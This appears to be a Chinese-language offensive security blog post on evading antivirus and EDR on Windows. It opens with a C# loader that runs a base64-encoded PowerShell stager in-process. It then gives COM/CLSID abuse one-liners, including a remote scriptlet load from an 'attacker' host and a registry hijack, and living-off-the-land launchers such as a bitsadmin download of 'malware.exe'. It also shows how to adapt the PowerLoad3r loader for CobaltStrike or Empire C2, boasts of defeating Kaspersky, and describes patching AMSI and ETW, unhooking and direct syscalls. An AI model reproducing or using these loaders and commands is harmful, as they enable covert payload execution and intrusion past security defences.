using System;using System.Text;using System.Collections.ObjectModel;using System.Management.Automation;using System.Management.Automation.Runspaces;namespaceSharpPick{    classProgram    {        /// <summary>        /// Executes a PowerShell command without launching powershell.exe        /// </summary>        /// <param name="command">The PowerShell script to execute</param>        /// <returns>Output of the PowerShell command as a string</returns>        static string ExecutePowerShellCommand(string command)        {            try            {                // Initialize the Runspace (PowerShell environment)                using (Runspace runspace = RunspaceFactory.CreateRunspace())                {                    runspace.Open();                    RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);                    Pipeline pipeline = runspace.CreatePipeline();                    // Add the PowerShell command to the pipeline                    pipeline.Commands.AddScript(command);                    // Add the "Out-String" cmdlet to capture output as a string                    pipeline.Commands.Add("Out-String");                    // Execute the pipeline                    Collection<PSObject> results = pipeline.Invoke();                    // Combine all the results into a single string                    StringBuilder stringBuilder = new StringBuilder();                    foreach (PSObject obj in results)                    {                        stringBuilder.AppendLine(obj.ToString());                    }                    // Return the resulting string, trimmed to remove extra whitespace                    return stringBuilder.ToString().Trim();                }            }            catch (Exception ex)            {                Console.WriteLine($"Error executing PowerShell command: {ex.Message}");                returnstring.Empty;            }        }        static int Main(string[] args)        {            try            {                // Base64-encoded stager                string base64Stager = "Your stages goes here";                // Decode the Base64-encoded stager to a string                string decodedStager = Encoding.Unicode.GetString(Convert.FromBase64String(base64Stager));                // Execute the decoded PowerShell stager and capture the result                string output = ExecutePowerShellCommand(decodedStager);                // Log the result (for debugging purposes)                Console.WriteLine("PowerShell Output: ");                Console.WriteLine(output);                return0;            }            catch (Exception ex)            {                Console.WriteLine($"Error in Main: {ex.Message}");                return1;            }        }    }}
```  
  
**它是如何工作的？**  
- Runspace  
对象通过RunspaceFactory.CreateRunspace()  
创建。这在.NET 运行时中分配一个专用的执行环境，runspace 是一个处理 PowerShell 脚本执行的独立线程  
  
- 在 runspace 内创建Pipeline  
对象，用于处理命令的顺序执行。当你添加一个命令 (如Get-Process  
) 时，它会被编译成中间形式并传递给 pipeline，在那里执行  
  
- 添加到 pipeline 的每个命令都被转换为CommandProcessor  
，将脚本转换为字节码以供执行。这发生在 runspace 内，避免了需要外部进程如powershell.exe  
  
- PowerShell 对象作为.NET 对象 (如PSObject  
) 创建，这些对象由.NET 的垃圾收集器管理，但 PowerShell 的内部内存管理确保它们在 runspace 关闭时被正确处置  
  
## - 劫持和滥用鲜为人知的 CLSID  
  
那么什么是 CLSID?  
- CLSID(类标识符) 是 128 位 GUID(例如{374DE290-123F-4565-9164-39C4925E467B}  
)，在 Windows 中唯一标识 COM 对象，使应用程序能够定位和与系统或第三方组件 (如设备管理器或 UI 处理程序) 交互。  
  
- 它们在 Windows 注册表的HKEY_CLASSES_ROOT\CLSID  
下映射，其中子键定义了对象可执行文件 (DLL/EXE) 的路径、线程模型和权限。  
  
- 应用程序使用 API(如CoCreateInstance  
) 和 CLSID 来实例化 COM 对象 - 这对于功能如文件资源管理器的传统搜索框 ({bc32b5-4eec-4de7-972d-bd8bd0324537}  
) 或 Office 应用程序至关重要。  
  
- 攻击者通过在HKCU\Software\Classes\CLSID  
(用户级) 中覆盖合法的注册表项来劫持 CLSID，将受信任的进程 (如explorer.exe  
) 重定向到恶意负载，而无需管理员权限。  
  
- 被劫持的 CLSID 能够隐蔽执行，通常在重启后仍然存在，并通过模仿合法的系统任务 (如磁盘清理vssadmin delete shadows  
) 来绕过检测。  
  
- 缓解措施包括监控注册表更改、对 CLSID 键实施最小权限访问、通过 AppLocker 白名单受信任的 COM 对象，以及验证引用的二进制文件的数字签名。  
  
- 开发人员必须确保正确的 CLSID 注册 (例如使用regsvr32  
) 并匹配 32/64 位架构以避免错误如0x80040154  
。  
  
现在来看滥用它们的精彩部分：  
  
ShellWindows COM (有效性：★★★★☆)  
```
$sh = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8–11CF-A442–00A0C90A8F39"))  $sh.Item().Document.Application.ShellExecute("calc.exe", "", "", $null, 0)
```  
  
ShellBrowserWindow (有效性：★★★★★)  
```
$browser = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1–11D1–8455–00A0C91F3880"))  $browser.Document.Application.ShellExecute("calc.exe")
```  
  
Excel 4.0 宏 (有效性：★★★★☆)  
```
$excel = [activator]::CreateInstance([type]::GetTypeFromCLSID("00024500–0000–0000-C000–000000000046"  $excel.ExecuteExcel4Macro('CALL("user32","ShellExecuteA","JJCCJJ",0,"open","calc.exe","","",5)')
```  
  
XMLDOM 远程脚本组件 (有效性：★★★★★)  
```
$xml = [activator]::CreateInstance([type]::GetTypeFromCLSID("88d969c5-f192–11d4-a65f-0040963251e5"))  $xml.async = $false  $xml.load("http://attacker/calc.sct")
```  
  
MMC20.Application (有效性：★★★☆☆)  
```
$mmc = [activator]::CreateInstance([type]::GetTypeFromCLSID("49B2791A-B1AE-4C90–9B8E-E860BA07F889"))  $mmc.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c calc.exe", "7")
```  
  
Verclsid.exe 代理 (有效性：★★★★☆)  
```
New-Item -Path “HKCU:\Software\Classes\CLSID\{01575CFE-9A55–4003-A5E1-F38D1EBDCBE1}\InprocServer32” -Force  Set-ItemProperty -Path “HKCU:\Software\Classes\CLSID\{01575CFE-9A55–4003-A5E1-F38D1EBDCBE1}\InprocServer32” -Name “(Default)” -Value “C:\Windows\System32\calc.exe” & verclsid.exe /S /C “{01575CFE-9A55–4003-A5E1-F38D1EBDCBE1}”
```  
## - 滥用 (鲜为人知的) Windows 二进制文件实现隐蔽的 Payload 执行  
  
Windows 内置了一些攻击者喜爱的可信二进制文件，这些文件每天都在使用，但稍加改动就能变成使安全防护措施失效的 **payload 启动器**  
  
**MSHTA**  
 可以直接在内存中执行 VBScript 或 JavaScript，不留下文件和痕迹  
```
mshta vbscript:Execute(“CreateObject(“”WScript.Shell””).Run “”calc.exe””,0 : close”)
```  
  
**Conhost**  
 在后台静默无头运行 payload，不会引起任何警报  
```
conhost.exe — headless C:\Windows\System32\calc.exe
```  
  
**Forfiles**  
 静默循环执行 payload，没人会对这个工具产生怀疑  
```
forfiles /P C:\Windows\System32 /M calc.exe /C “cmd /c calc.exe”
```  
  
**Regsvr32**  
 通过 COM objects 加载 scriptlets 绕过大多数防御措施 (这种方法已被广泛检测)  
```
regsvr32 /s /u /n /i:calc.exe scrobj.dll
```  
  
**BITSAdmin**  
 (后台传输服务) 可以隐秘地下载 payload  
```
bitsadmin /transfer job /download /priority high http://example.com/malware.exe C:\temp\malware.exe
```  
  
**InstallUtil**  
 (.NET 实用工具) 在安装过程中运行恶意 .NET 程序集  
```
bash InstallUtil.exe /logfile= /LogToConsole=false /U malicious.dll
```  
  
**Rasautou**  
 是的，这个你已经遗忘的远程访问工具能像幽灵一样悄无声息地执行 payload  
```
rasautou.exe –d/-a C:\Windows\System32\calc.exe
```  
## - PowerLoad3r 概述  
  
**如何修改它来运行你想要的内容（如果你想先了解它的功能和作用，请查看本节下面的部分！）**  
  
你听说过 PowerLoad3r (  
https://github.com/0xNinjaCyclone/PowerLoad3r  
) 吗？没有？让我来告诉你，这是一个用于运行 PowerShell 脚本的工具，这个工具非常强大！它配备了先进的规避技术，而且你猜怎么着？它的一些魔法是用纯汇编和 C 语言编写的。很刺激，对吧？  
  
但是等等，还有更多！准备好提升水平了吗？让我们来看看如何将 PowerLoad3r 与任何你选择的 C2 集成。  
  
你知道 WriteToPipes 函数吗？这就是魔法开始的地方。你需要修改它的调用来写入 shellcode，默认情况下它在第 622 行使用 IEX 来加载和执行 Mimikatz，所以我们将在这里修改代码。首先，计算仅从 shellcode 中获取的 base64 编码文本的字符数。然后，计算这些 base64 字符的总和，再加上一个彩蛋：额外的 8。是的，你没听错，加 8（base64 字符 + 8），这就是你将作为参数传递的大小。  
  
这里有一个小预览：  
```
WriteToPipe("$s = \"JHUATQBOAEEAQQBBAD0AIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=\"\n", 392);  WriteToPipe("$d = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($s))\n", 87);  WriteToPipe("IEX $d\n", 7);
```  
  
规避 Kaspersky 概念验证：与 CobaltStrike C2 集成：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOib9micKd4QEXxwEodNUgxJ340mbaDCG8xuicUfcGIFKacyQWKSTaGGnaMDohg78ut0cc2HVGAVOVDg/640?wx_fmt=png&from=appmsg "")  
  
Empire C2 (视频): 演示将很快上传。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOib9micKd4QEXxwEodNUgxJ3bw8VCxN0loz2wVZDreR4VIoz7ohaGNonicic08ICicCFII1ibhgzU2bsfg/640?wx_fmt=png&from=appmsg "")  
  
使用 Empire C2  
> **接下来发生了什么？我们完全绕过并击败了 Kaspersky Internet Security!**  
  
## PowerLoad3r 是如何工作的？  
  
**不要对博客的这部分感到奇怪，我将用一个故事来解释这个神奇的工具 :))**  
  
从这里查看工具 =>   
https://github.com/0xNinjaCyclone/PowerLoad3r  
  
**子进程的故事**  
  
故事始于 PowerLoad3r 在内存中创建一个伪装的 PowerShell 实例，这种技术旨在绕过应用程序控制并作为 Sysmon/事件日志的早期干扰，确保进程创建的实际指令不会被看到。然后，PowerLoad3r 对子进程应用特定策略，防止任何未签名的 Microsoft DLL 被加载到子进程中。这个策略旨在阻止 EDR 系统可能依赖的基于 DLL 的检测方法。  
  
他们计划的主要部分涉及父进程和名为"**pwsh.exe**  
"的子进程之间的秘密通信。使用"匿名管道"创建了一个隐藏通道，允许父进程发送 PowerShell 命令给子进程，而无需将它们作为参数传递。这个巧妙的策略帮助 PowerLoad3r 避免被 EDR 系统检测到。  
  
父进程并非只是袖手旁观。它密切监视子进程，寻找来自 EDR 安全机制的任何注入钩子。如果发现任何钩子，PowerLoad3r 会迅速移除它们，保护子进程并保持操作的隐蔽性。此外，父进程在子进程中修补了关键的安全功能，如 AMSI (反恶意软件扫描接口) 和 ETW (Windows 事件追踪)，使 EDR 更难检测到活动。  
  
**父进程的策略**  
  
随着故事继续，焦点转移到准备执行自己技巧的父进程 PowerLoad3r 上。第一步是使用动态加载来混淆 API。这是一个避免导入地址表 (IAT) 的巧妙策略，使 API 调用对 EDR 系统来说似乎是不可见的。  
  
**动态加载如何帮助绕过导入地址表 (IAT)？**  
  
**=>**  
 IAT 是程序可执行文件的一部分，列出了程序需要的 DLL(动态链接库) 中外部函数的地址。当程序启动时，操作系统用这些函数的实际内存地址填充 IAT。然而，动态加载通过在运行时解析函数地址来工作，而不是将它们列在 IAT 中。这种方法允许程序绕过 IAT，使安全系统更难检测可能隐藏在 IAT 中的恶意活动。  
  
PowerLoad3r 更进一步，使用自定义汇编代码来实现 GetModuleHandle 和 GetProcAddress 等函数。通过利用 HellsGate、HalosGate 和 Veles' Reeks 等高级技术，PowerLoad3r 能够进行直接系统调用。这种强大的方法绕过了 EDR 的监控，允许 PowerLoad3r 不被注意地执行其操作，让 EDR 系统在追踪其行动时陷入混乱。  
  
**解钩技术如何与 HellsGate、HalosGate 和 Veles' Reeks 结合来执行直接系统调用以规避安全机制？**  
  
**=>**  
 解钩技术与 HellsGate、HalosGate 和 Veles' Reeks 结合使用时，能够更隐蔽地执行直接系统调用，从而帮助规避安全机制。HellsGate、HalosGate 和 Veles' Reeks 是解钩规避技术，它们促进了间接系统调用的执行，这些是低级系统操作，绕过了可能被安全软件监控的常规 API 调用。解钩是指移除或禁用安全解决方案放置的用于监控系统行为的钩子的过程。通过将解钩与这些框架一起使用，恶意代码可以通过确保安全监控钩子被中和来规避检测，同时使用直接系统调用来与系统交互，绕过高级 API，从而降低被安全软件检测的可能性。  
  
钩子引擎检测点的叙述被修改，避开了扫描钩子引擎 DLL 的误解。PowerLoad3r 阐明钩子本身才是焦点。如果发现钩子捕获了进程，父进程准备执行解钩，将子进程从潜在的危险控制中解放出来，这是一个确保他们的行动保持完好的明智之举。  
  
当 PowerLoad3r 和 PowerShell 的字节大小编年史结束时，他们留下了一群困惑的 EDR 哨兵、修补过的进程，以及一个刻在数字传说中的规避遗产。他们的冒险揭示了一个关于技术实力和颠覆性策略的故事，这将被代码创作者和二进制吟游诗人在未来的循环中解析和思考。当他们融回代码宇宙时，他们的玩笑和欢乐冒险的故事等待着在规避编年史中一字一字、一点一点地被重新讲述。  
  
